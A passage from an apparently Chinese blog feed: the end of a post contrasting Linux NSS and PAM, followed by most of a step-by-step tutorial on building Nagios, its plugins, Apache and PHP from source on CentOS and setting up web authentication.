<p>libc函数往往需要一些本地信息, 比如getpwent()参数需要/etc/passwd文件. 再gethostbyname()函数等等, 对于日益增加又健壮的服务(如NIS), 它种服务在libc的函数上被hack, 但不能永远靠hack代码去增加功能的.所以在libc5就加入NSS结构, 结构如下:<img src="http://hiphotos.baidu.com/magic_wz/pic/item/cc62178a281348109f2fb4fe.jpg" small="0" /><br /><br /><br /><b>所谓的Name Service是如下类信息:</b>aliasesethersgrouphostsnetgroupnetworkspasswdprotocolspublickeyrpcservicesshadow<em> 这些信息都是通过libc的函数去得到的.<br />C级函数是依靠/etc/nsswitch.conf文件去选择正确的<b>back_end</b>linux下, <b>back_end</b>是存放在/lib/libnss_</em>NSS与PAM 从Name Service提供的信息看, NSS 与 PAM 有些事是相同的. 但是细看, 两者是不一样的.<em> NSS返回查询的结果数据</em> PAM提供多种灵活的认证方案 在NSS中, 容易与认证扯上关系的, 无非是NSS提供的passwd. &nbsp;从getpwent函数的手册上看, 本函数是返回一个C结构体的:<br />&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; struct passwd {&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; char <em>pw_name; /</em> username <em>/&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; char </em>pw_passwd; /<em> user password </em>/&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uid_t pw_uid; /<em> user ID </em>/&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; gid_t pw_gid; /<em> group ID </em>/&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; char <em>pw_gecos; /</em> real name <em>/&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; char </em>pw_dir; /<em> home directory </em>/&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; char <em>pw_shell; /</em> shell program */&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; };用户程序结果使用返回的信息(密码)与用户的输入信息(密码)是可以实现认证的效果. 但是这样需要用户的程序处理更多的事情(相比程序使用PAM的情况).<br />对于使用libc的函数去处理认证的情况, 在NSS的结构上, 还可以做到类PAM一样灵活配置的: 因为NSS是从libc函数去调用相应的<b>back_end</b>的. 这样就可以不同的<b>back_end</b>去改变使用不同database而不像PAM一样不影响到(使用libc的)程序本身.<br />例如, ldap就有一个NSS的<b>back_end</b>, 在ubuntu下叫libnss-ldap. 配置nsswitch.conf去使用本<b>back_end</b>, 就可以使程序把LDAP作为数据源.<br />总 修改程序的认证数据源, 需要程序本身使用到如下两种结构基础1. 使用libc的函数处理认证2. 使用PAM机制<br /><br />参考文档: <a href="http://docs.hp.com/en/305/uxint.html"><a href="http://docs.hp.com/en/305/uxint.html">http://docs.hp.com/en/305/uxint.html</a></a>&nbsp;<a href="http://jessinio.blogspot.com/2009/07/nsspam.html">源地址： <a href="http://jessinio.blogspot.com/2009/07/nsspam.html">http://jessinio.blogspot.com/2009/07/nsspam.html</a></a>源地址需要翻墙才能打开，我好不容易找到这个，赶紧先分享过来，翻墙不容易<br /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Nagios配置——添加linux主机监控]]></title>
    <link href="http://archulate.github.io/blog/2013/05/22/nagios/"/>
    <updated>2013-05-22T19:18:31+08:00</updated>
    <id>http://archulate.github.io/blog/2013/05/22/nagios</id>
    <content type="html"><![CDATA[<!--more-->


<p>一、Nagios简介</span></strong></span></p></p>

<p><a href="http://images.cnitblog.com/blog/370046/201301/30172010-1a4517cdb03747cc8d37837d6f550d8a.png"><img style="background-image: none; margin: 6px 0px 0px 19px; padding-left: 0px; padding-right: 0px; display: inline; float: right; padding-top: 0px; border-width: 0px;" title="Nagios logo" src="http://images.cnitblog.com/blog/370046/201301/30172011-56b472de18914a4b90065e303e02e0f0.png" alt="Nagios logo" width="212" height="50" border="0" /></a></p>




<p>　　Nagios是一款开源的电脑系统和网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设置，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。</p>




<p>　　Nagios原名为NetSaint，由Ethan Galstad开发并维护至今。NAGIOS是一个缩写形式: &#8220;Nagios Ain&#8217;t Gonna Insist On Sainthood&#8221; Sainthood 翻译为圣徒，而&#8221;Agios&#8221;是&#8221;saint&#8221;的希腊表示方法。Nagios被开发在Linux下使用，但在Unix下也工作得非常好。</p>




<p><strong>主要功能</strong></p>




<ul>

<li>网络服务监控（SMTP、POP3、HTTP、NNTP、ICMP、SNMP、FTP、SSH）</li>

<li>主机资源监控（CPU load、disk usage、system logs），也包括Windows主机（使用NSClient++ plugin）</li>

<li>可以指定自己编写的Plugin通过网络收集数据来监控任何情况（温度、警告&hellip;&hellip;）</li>

<li>可以通过配置Nagios远程执行插件远程执行脚本</li>

<li>远程监控支持SSH或SSL加通道方式进行监控</li>

<li>简单的plugin设计允许用户很容易的开发自己需要的检查服务，支持很多开发语言（shell scripts、C++、Perl、ruby、Python、PHP、C#等）</li>

<li>包含很多图形化数据Plugins（Nagiosgraph、Nagiosgrapher、PNP4Nagios等）</li>

<li>可并行服务检查</li>

<li>能够定义网络主机的层次，允许逐级检查，就是从父主机开始向下检查</li>

<li>当服务或主机出现问题时发出通告，可通过email, pager, sms 或任意用户自定义的plugin进行通知</li>

<li>能够自定义事件处理机制重新激活出问题的服务或主机</li>

<li>自动日志循环</li>

<li>支持冗余监控</li>

<li>包括Web界面可以查看当前网络状态，通知，问题历史，日志文件等</li>

</ul>




<p><span style="font-size: 16px;"><strong><span style="color: #800000;">二、Nagios工作原理</span></strong></span></p>




<p>　　Nagios的功能是监控服务和主机，但是他自身并不包括这部分功能，所有的监控、检测功能都是通过各种插件来完成的。</p>




<p>　　启动Nagios后，它会周期性的自动调用插件去检测服务器状态，同时Nagios会维持一个队列，所有插件返回来的状态信息都进入队列，Nagios每次都从队首开始读取信息，并进行处理后，把状态结果通过web显示出来。</p>




<p>　　Nagios提供了许多插件，利用这些插件可以方便的监控很多服务状态。安装完成后，在nagios主目录下的/libexec里放有nagios自带的可以使用的所有插件，如，check_disk是检查磁盘空间的插件，check_load是检查CPU负载的，等等。每一个插件可以通过运行./check_xxx &ndash;h 来查看其使用方法和功能。</p>




<p>　　Nagios可以识别4种状态返回信息，即 0(OK)表示状态正常/绿色、1(WARNING)表示出现警告/黄色、2(CRITICAL)表示出现非常严重的错误/红色、3(UNKNOWN)表示未知错误/深黄色。Nagios根据插件返回来的值，来判断监控对象的状态，并通过web显示出来，以供管理员及时发现故障。</p>




<p><strong>四种监控状态</strong></p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172012-5e48d4a0cbc542b88faf0cdaab257bef.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="2" src="http://images.cnitblog.com/blog/370046/201301/30172016-8d40420c5c50475cb6ee600cd5305716.jpg" alt="2" width="640" height="123" border="0" /></a></p>




<p>　　再说报警功能，如果监控系统发现问题不能报警那就没有意义了，所以报警也是nagios很重要的功能之一。但是，同样的，Nagios 自身也没有报警部分的代码，甚至没有插件，而是交给用户或者其他相关开源项目组去完成的。</p>




<p>　　Nagios 安装，是指基本平台，也就是Nagios软件包的安装。它是监控体系的框架，也是所有监控的基础。</p>




<p>　　打开Nagios官方的文档，会发现Nagios基本上没有什么依赖包，只要求系统是Linux或者其他Nagios支持的系统。不过如果你没有安装apache（http服务），那么你就没有那么直观的界面来查看监控信息了，所以apache姑且算是一个前提条件。关于apache的安装，网上有很多，照着安装就是了。安装之后要检查一下是否可以正常工作。</p>




<p>　　知道Nagios 是如何通过插件来管理服务器对象后，现在开始研究它是如何管理远端服务器对象的。Nagios 系统提供了一个插件NRPE。Nagios 通过周期性的运行它来获得远端服务器的各种状态信息。它们之间的关系如下图所示：</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172017-a0cab434c3184ee48163b3c2f86d0299.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="1" src="http://images.cnitblog.com/blog/370046/201301/30172017-71721df06174482a8b299cb637b7bfcb.jpg" alt="1" width="580" height="435" border="0" /></a></p>




<p><span style="line-height: 1.5;">Nagios 通过NRPE 来远端管理服务</span></p>




<p style="margin-left: 30px;">1. Nagios 执行安装在它里面的check_nrpe 插件，并告诉check_nrpe 去检测哪些服务。</p>




<p style="margin-left: 30px;">2. 通过SSL，check_nrpe 连接远端机子上的NRPE daemon</p>




<p style="margin-left: 30px;">3. NRPE 运行本地的各种插件去检测本地的服务和状态(check_disk,..etc)</p>




<p style="margin-left: 30px;">4. 最后，NRPE 把检测的结果传给主机端的check_nrpe，check_nrpe 再把结果送到Nagios状态队列中。</p>




<p style="margin-left: 30px;">5. Nagios 依次读取队列中的信息，再把结果显示出来。</p>




<p><span style="font-size: 16px;"><strong><span style="color: #800000;">三、实验环境</span></strong></span></p>




<table style="width: 790px;" border="0" cellspacing="0" cellpadding="2">

<tbody>

<tr>

<td valign="top" width="135"><strong>Host Name</strong></td>

<td valign="top" width="199"><strong>OS</strong></td>

<td valign="top" width="112"><strong>IP</strong></td>

<td valign="top" width="342"><strong>Software</strong></td>

</tr>

<tr>

<td valign="top" width="135">Nagios-Server</td>

<td valign="top" width="199">CentOS release 6.3 (Final)</td>

<td valign="top" width="112">192.168.1.108</td>

<td valign="top" width="342">Apache、Php、Nagios、nagios-plugins</td>

</tr>

<tr>

<td valign="top" width="135">Nagios-Linux</td>

<td valign="top" width="199"><span>CentOS release 5.8 (Final)</span></td>

<td valign="top" width="112">192.168.1.111</td>

<td valign="top" width="342"><span>nagios-plugins、nrpe</span></td>

</tr>

<tr>

<td valign="top" width="135">Nagios-Windows</td>

<td valign="top" width="199">Windows XP</td>

<td valign="top" width="112">192.168.1.113&nbsp;</td>

<td valign="top" width="342">NSClient++</td>

</tr>

</tbody>

</table>




<p>Server 安装了nagios软件，对监控的数据做处理，并且提供web界面查看和管理。当然也可以对本机自身的信息进行监控。</p>




<p>Client 安装了NRPE等客户端，根据监控机的请求执行监控，然后将结果回传给监控机。</p>




<p>防火墙已关闭/iptables: Firewall is not running.</p>




<p>SELINUX=disabled</p>




<p><span style="font-size: 16px;"><strong><span style="color: #800000;">四、实验目标</span></strong></span></p>




<p><span style="line-height: 1.5;"><img src="http://images.cnitblog.com/blog/370046/201302/20103056-bc6618242a724ddb89ce3d15369e6728.jpg" alt="" /></span></p>




<p><span style="font-size: 16px;"><strong><span style="line-height: 1.5; color: #800000;">五、Nagios服务端安装</span></strong></span></p>




<p><span style="line-height: 1.5;">5.1 基础支持套件：gcc glibc glibc-common gd gd-devel xinetd openssl-devel&nbsp;</span></p>




<p># rpm -q gcc glibc glibc-common gd gd-devel xinetd openssl-devel</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172023-cbd356b06f1c4fb796b99237b3554b2f.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="8" src="http://images.cnitblog.com/blog/370046/201301/30172024-19a493bd6a7a4f8e8dd73d10e2b776dd.jpg" alt="8" width="709" height="130" border="0" /></a></p>




<p>如果系统中没有这些套件，使用yum 安装</p>




<p># yum install -y gcc glibc glibc-common gd gd-devel xinetd openssl-devel</p>




<p>5.2 创建nagios用户和用户组</p>




<div class="cnblogs_code">

<pre><span style="color: #000000;"># useradd -s /sbin/nologin nagios

# mkdir /usr/local/nagios

# chown -R nagios.nagios /usr/local/nagios</span></pre>

</div>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172026-dd983461e7e24d3fa12c39d213616afc.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="6" src="http://images.cnitblog.com/blog/370046/201301/30172026-726f330b7481428db1fbe2d49a95238c.jpg" alt="6" width="549" height="70" border="0" /></a></p>




<p>查看nagios 目录的权限</p>




<p># ll -d /usr/local/nagios/</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172027-2efbcf5f62f34eae857b7c48c0f94d02.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="7" src="http://images.cnitblog.com/blog/370046/201301/30172028-91c2fce9081d407e9f43a317f76400d0.jpg" alt="7" width="547" height="53" border="0" /></a></p>




<p>5.3 编译安装Nagios</p>




<p># wget <a href="http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.4.3.tar.gz">http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.4.3.tar.gz</a></p>




<p># tar zxvf nagios-3.4.3.tar.gz</p>




<p># cd nagios</p>




<p># ./configure &#8211;prefix=/usr/local/nagios</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172029-51aac459f3a34106af7db6aaaa403d9e.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="9" src="http://images.cnitblog.com/blog/370046/201301/30172029-53da46cc349f4f378ff4fc513353d040.jpg" alt="9" width="900" height="86" border="0" /></a></p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172030-18fdb7961c474b75a2b033e2a4171519.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="10" src="http://images.cnitblog.com/blog/370046/201301/30172031-fef7fe1f8aa74ee399a5d92a643ad6fa.jpg" alt="10" width="515" height="379" border="0" /></a></p>




<p># make all</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172031-5c6a7463c11d4544bee8f2eed12d7647.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="11" src="http://images.cnitblog.com/blog/370046/201301/30172032-443db8833df0411abb7cd45e2cd84868.jpg" alt="11" width="561" height="463" border="0" /></a></p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172034-ebe3fcafffe94564b8161e6b78fe64c8.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="12" src="http://images.cnitblog.com/blog/370046/201301/30172035-cce0c1098a914074a5074351c24be958.jpg" alt="12" width="561" height="370" border="0" /></a></p>




<p># make install</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172035-b01026f0079c477c815351fb70635f40.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="13" src="http://images.cnitblog.com/blog/370046/201301/30172036-77cffeb39dfc4c1d82128cbfca961f19.jpg" alt="13" width="561" height="239" border="0" /></a></p>




<p># make install-init</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172038-629553af940645d3a1e1b34db39106e7.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="14" src="http://images.cnitblog.com/blog/370046/201301/30172039-f7f0aa8521394d8484a57234f68ea25e.jpg" alt="14" width="640" height="104" border="0" /></a></p>




<p># make install-commandmode</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172039-977a570a3633463e905c54ae6b86b8dc.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="15" src="http://images.cnitblog.com/blog/370046/201301/30172040-1b55dfaa66114e64a7b9ccc3c63983f9.jpg" alt="15" width="609" height="106" border="0" /></a></p>




<p># make install-config</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172042-cdce5169280944e3b61f4df6cc33311d.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="16" src="http://images.cnitblog.com/blog/370046/201301/30172043-24f2e472c68c46119648137b6a76b946.jpg" alt="16" width="900" height="238" border="0" /></a></p>




<p># chkconfig &#8211;add nagios</p>




<p># chkconfig &#8211;level 35 nagios on</p>




<p># chkconfig &#8211;list nagios</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172044-219e4c37980a450c904fb0cb283c73cd.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="17" src="http://images.cnitblog.com/blog/370046/201301/30172044-18a7b53a39cc4111927b7e9426a2abbd.jpg" alt="17" width="570" height="79" border="0" /></a></p>




<p>5.4 验证程序是否被正确安装</p>




<p>切换目录到安装路径（这里是/usr/local/nagios），看是否存在etc、bin、sbin、share、var 这五个目录，如果存在则可以表明程序被正确的安装到系统了。Nagios 各个目录用途说明如下：</p>




<table style="width: 702px;" border="0" cellspacing="0" cellpadding="2">

<tbody>

<tr>

<td valign="top" width="160">bin</td>

<td valign="top" width="540">Nagios 可执行程序所在目录</td>

</tr>

<tr>

<td valign="top" width="160">etc</td>

<td valign="top" width="540">Nagios 配置文件所在目录</td>

</tr>

<tr>

<td valign="top" width="160">sbin</td>

<td valign="top" width="540">Nagios CGI 文件所在目录，也就是执行外部命令所需文件所在的目录</td>

</tr>

<tr>

<td valign="top" width="160">share</td>

<td valign="top" width="540">Nagios网页文件所在的目录</td>

</tr>

<tr>

<td valign="top" width="160">libexec</td>

<td valign="top" width="540">Nagios 外部插件所在目录</td>

</tr>

<tr>

<td valign="top" width="160">var</td>

<td valign="top" width="540">Nagios 日志文件、lock 等文件所在的目录</td>

</tr>

<tr>

<td valign="top" width="160">var/archives</td>

<td valign="top" width="540">Nagios 日志自动归档目录</td>

</tr>

<tr>

<td valign="top" width="160">var/rw</td>

<td valign="top" width="540">用来存放外部命令文件的目录</td>

</tr>

</tbody>

</table>




<p>5.5 安装Nagios 插件</p>




<p># wget <a href="http://prdownloads.sourceforge.net/sourceforge/nagiosplug/nagios-plugins-1.4.16.tar.gz">http://prdownloads.sourceforge.net/sourceforge/nagiosplug/nagios-plugins-1.4.16.tar.gz</a></p>




<p># tar zxvf nagios-plugins-1.4.16.tar.gz</p>




<p># cd nagios-plugins-1.4.16</p>




<p># ./configure &#8211;prefix=/usr/local/nagios</p>




<p># make &amp;&amp; make install</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172045-9f33e94cc4034186b2b81b92370fe259.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="18" src="http://images.cnitblog.com/blog/370046/201301/30172046-766b31a9dda24be4a64e8134153d483f.jpg" alt="18" width="900" height="96" border="0" /></a></p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172046-64f935847ba9428d979a2d5c8b0987d2.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="19" src="http://images.cnitblog.com/blog/370046/201301/30172047-007de1f997694c60bdb49299a6ace154.jpg" alt="19" width="568" height="221" border="0" /></a></p>




<p>5.6 安装与配置Apache和Php</p>




<p>Apache 和Php 不是安装nagios 所必须的，但是nagios提供了web监控界面，通过web监控界面可以清晰的看到被监控主机、资源的运行状态，因此，安装一个web服务是很必要的。 <br />需要注意的是，nagios在nagios3.1.x版本以后，配置web监控界面时需要php的支持。这里我们下载的nagios版本为nagios-3.4.3，因此在编译安装完成apache后，还需要编译php模块，这里选取的php版本为php5.4.10。</p>




<p>a. 安装Apache</p>




<p># wget <a title="http://labs.mop.com/apache-mirror//httpd/httpd-2.2.23.tar.gz" href="http://archive.apache.org/dist/httpd/httpd-2.2.23.tar.gz">http://archive.apache.org/dist/httpd/httpd-2.2.23.tar.gz</a></p>




<p># tar zxvf httpd-2.2.23.tar.gz</p>




<p># cd httpd-2.2.23</p>




<p># ./configure &#8211;prefix=/usr/local/apache2</p>




<p># make &amp;&amp; make install</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172048-277b391cdc8a4e7da295d6bf9c3dfe6f.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="22" src="http://images.cnitblog.com/blog/370046/201301/30172049-000f66730e104f96b85ca2ec3000a3a6.jpg" alt="22" width="570" height="377" border="0" /></a></p>




<p>若出现错误：</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/01211923-d930a24ac2e849809cb2b86c78c543d1.jpg" alt="" /></p>




<p>则在<span>编译时入加 &#8211;with-included-apr 即可解决。</span></p>




<p>b. 安装Php</p>




<p># wget <a href="http://cn2.php.net/distributions/php-5.4.10.tar.gz">http://cn2.php.net/distributions/php-5.4.10.tar.gz</a></p>




<p># tar zxvf php-5.4.10.tar.gz </p>




<p># cd php-5.4.10</p>




<p># ./configure &#8211;prefix=/usr/local/php &#8211;with-apxs2=/usr/local/apache2/bin/apxs </p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172050-6bda75716f614a6ab7f2acf8de422062.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="23" src="http://images.cnitblog.com/blog/370046/201301/30172052-37e29eb203e544119dcd267618256daf.jpg" alt="23" width="579" height="342" border="0" /></a></p>




<p># make &amp;&amp; make install</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172054-97af3f5b712041f78d9e44d94ac17bbd.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="24" src="http://images.cnitblog.com/blog/370046/201301/30172056-6b876252535c467e83874bc6ee83eaff.jpg" alt="24" width="900" height="443" border="0" /></a></p>




<p>c. 配置apache <br />找到apache 的配置文件/usr/local/apache2/conf/httpd.conf       <br />找到：       </p>




<div class="cnblogs_code">

<pre><span style="color: #000000;">User daemon 

Group daemon </span></pre>

</div>




<p><span style="line-height: 1.5;">修改为&nbsp;</span></p>




<div class="cnblogs_code">

<pre><span style="color: #000000;">User nagios 

Group nagios </span></pre>

</div>




<p><span style="line-height: 1.5;">然后找到&nbsp;</span></p>




<div class="cnblogs_code">

<pre><span style="color: #0000ff;">&lt;</span><span style="color: #800000;">IfModule </span><span style="color: #ff0000;">dir_module</span><span style="color: #0000ff;">&gt;</span><span style="color: #000000;"> 

　　DirectoryIndex index.html 

</span><span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">IfModule</span><span style="color: #0000ff;">&gt;</span> </pre>

</div>




<p><span style="line-height: 1.5;">修改为&nbsp;</span></p>




<div class="cnblogs_code">

<pre><span style="color: #0000ff;">&lt;</span><span style="color: #800000;">IfModule </span><span style="color: #ff0000;">dir_module</span><span style="color: #0000ff;">&gt;</span><span style="color: #000000;"> 

　　DirectoryIndex index.html index.php 

</span><span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">IfModule</span><span style="color: #0000ff;">&gt;</span> </pre>

</div>




<p><span style="line-height: 1.5;">接着增加如下内容：&nbsp;</span></p>




<div class="cnblogs_code">

<pre>AddType application/x-httpd-php .php </pre>

</div>




<p><span style="line-height: 1.5;">为了安全起见，一般情况下要让nagios 的web 监控页面必须经过授权才能访问，这需要增加验证配置，即在httpd.conf 文件最后添加如下信息：&nbsp;</span></p>




<div class="cnblogs_code">

<pre><span style="color: #000000;">#setting for nagios 

ScriptAlias /nagios/cgi-bin "/usr/local/nagios/sbin" 

</span><span style="color: #0000ff;">&lt;</span><span style="color: #800000;">Directory </span><span style="color: #ff0000;">"/usr/local/nagios/sbin"</span><span style="color: #0000ff;">&gt;</span><span style="color: #000000;"> 

     AuthType Basic 

     Options ExecCGI 

     AllowOverride None 

     Order allow,deny 

     Allow from all 

     AuthName "Nagios Access" 

     AuthUserFile /usr/local/nagios/etc/htpasswd             //用于此目录访问身份验证的文件 

     Require valid-user 

</span><span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">Directory</span><span style="color: #0000ff;">&gt;</span><span style="color: #000000;"> 

Alias /nagios "/usr/local/nagios/share" 

</span><span style="color: #0000ff;">&lt;</span><span style="color: #800000;">Directory </span><span style="color: #ff0000;">"/usr/local/nagios/share"</span><span style="color: #0000ff;">&gt;</span><span style="color: #000000;"> 

     AuthType Basic 

     Options None 

     AllowOverride None 

     Order allow,deny 

     Allow from all 

     AuthName "nagios Access" 

     AuthUserFile /usr/local/nagios/etc/htpasswd 

     Require valid-user 

</span><span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">Directory</span><span style="color: #0000ff;">&gt;</span> </pre>

</div>




<p><span style="line-height: 1.5;">d. 创建apache目录验证文件&nbsp;</span></p>




<p>在上面的配置中，指定了目录验证文件htpasswd，下面要创建这个文件：</p>




<p># /usr/local/apache2/bin/htpasswd -c /usr/local/nagios/etc/htpasswd david</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172056-36df7ebedd9d448a8b38a2ccd4633ebe.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="25" src="http://images.cnitblog.com/blog/370046/201301/30172057-cbb9c052a34545ccab5420800eaaec3b.jpg" alt="25" width="805" height="78" border="0" /></a> <br />这样就在/usr/local/nagios/etc 目录下创建了一个htpasswd 验证文件，当通过<a href="http://172.16.1.124/nagios/">http://192.168.1.108/nagios/</a> 访问时就需要输入用户名和密码了。       </p>




<p>e. 查看认证文件的内容</p>




<p># cat /usr/local/nagios/etc/htpasswd </p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172058-a256928a00cf40769bc3a5815401732b.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border-width: 0px;" title="26" src="http://images.cnitblog.com/blog/370046/201301/30172058-dfc48c3f5bc748819cf91ce007ee2a18.jpg" alt="26" width="520" height="52" border="0" /></a></p>




<p>f. 启动apache 服务      </p>




<p># /usr/local/apache2/bin/apachectl start</p>




<p>到这里nagios 的安装也就基本完成了，你可以通过web来访问了。</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/20112657-ad1f78da708c47a5b47f94eae9bbfd91.jpg" alt="" /></p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/20112709-e18bf9ab06ca444188b3722a1aacbc5e.jpg" alt="" width="900" /></p>




<p><span style="font-size: 16px;"><strong><span style="color: #800000;">六、配置Nagios</span></strong></span></p>




<p>Nagios 主要用于监控一台或者多台本地主机及远程的各种信息，包括本机资源及对外的服务等。默认的Nagios 配置没有任何监控内容，仅是一些模板文件。若要让Nagios 提供服务，就必须修改配置文件，增加要监控的主机和服务，下面将详细介绍。</p>




<p>6.1 默认配置文件介绍</p>




<p>Nagios 安装完毕后，默认的配置文件在/usr/local/nagios/etc目录下。</p>




<p><a href="http://images.cnitblog.com/blog/370046/201301/30172103-011c4098757a465fa8e4462f89768c84.jpg"><img style="background-image: none; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border: 0px;" title="29" src="http://images.cnitblog.com/blog/370046/201301/30172104-f4ed448295f04f2fa489dddefa6a09bd.jpg" alt="29" width="900" height="135" border="0" /></a></p>




<p>每个文件或目录含义如下表所示：</p>




<table style="width: 812px;" border="0" cellspacing="0" cellpadding="2">

<tbody>

<tr>

<td valign="top" width="200"><strong>文件名或目录名</strong></td>

<td valign="top" width="610"><strong>用途</strong></td>

















































     </tr>

<tr>

<td valign="top" width="200">cgi.cfg</td>

<td valign="top" width="610">控制CGI访问的配置文件</td>

















































     </tr>

<tr>

<td valign="top" width="200">nagios.cfg</td>

<td valign="top" width="610">Nagios 主配置文件</td>

















































     </tr>

<tr>

<td valign="top" width="200">resource.cfg</td>

<td valign="top" width="610">变量定义文件，又称为资源文件，在些文件中定义变量，以便由其他配置文件引用，如$USER1$</td>

















































     </tr>

<tr>

<td valign="top" width="200">objects</td>

<td valign="top" width="610">objects 是一个目录，在此目录下有很多配置文件模板，用于定义Nagios 对象</td>

















































     </tr>

<tr>

<td valign="top" width="200">objects/commands.cfg</td>

<td valign="top" width="610">命令定义配置文件，其中定义的命令可以被其他配置文件引用</td>

















































     </tr>

<tr>

<td valign="top" width="200">objects/contacts.cfg</td>

<td valign="top" width="610">定义联系人和联系人组的配置文件</td>

















































     </tr>

<tr>

<td valign="top" width="200">objects/localhost.cfg</td>

<td valign="top" width="610">定义监控本地主机的配置文件</td>

















































     </tr>

<tr>

<td valign="top" width="200">objects/printer.cfg</td>

<td valign="top" width="610">定义监控打印机的一个配置文件模板，默认没有启用此文件</td>

















































     </tr>

<tr>

<td valign="top" width="200">objects/switch.cfg</td>

<td valign="top" width="610">定义监控路由器的一个配置文件模板，默认没有启用此文件</td>

















































     </tr>

<tr>

<td valign="top" width="200">objects/templates.cfg</td>

<td valign="top" width="610">定义主机和服务的一个模板配置文件，可以在其他配置文件中引用</td>

















































     </tr>

<tr>

<td valign="top" width="200">objects/timeperiods.cfg</td>

<td valign="top" width="610">定义Nagios 监控时间段的配置文件</td>

















































     </tr>

<tr>

<td valign="top" width="200">objects/windows.cfg</td>

<td valign="top" width="610">监控Windows 主机的一个配置文件模板，默认没有启用此文件</td>

















































     </tr>

















































   </tbody>

















































</table>




<p>6.2 配置文件之间的关系</p>




<p>在nagios的配置过程中涉及到的几个定义有：主机、主机组，服务、服务组，联系人、联系人组，监控时间，监控命令等，从这些定义可以看出，nagios各个配置文件之间是互为关联，彼此引用的。   </p>




<p>成功配置出一台nagios监控系统，必须要弄清楚每个配置文件之间依赖与被依赖的关系，最重要的有四点：    </p>




<p style="margin-left: 30px;">第一：定义监控哪些主机、主机组、服务和服务组；    <br />第二：定义这个监控要用什么命令实现；    <br />第三：定义监控的时间段；    <br />第四：定义主机或服务出现问题时要通知的联系人和联系人组。</p>




<p>6.3 配置Nagios</p>




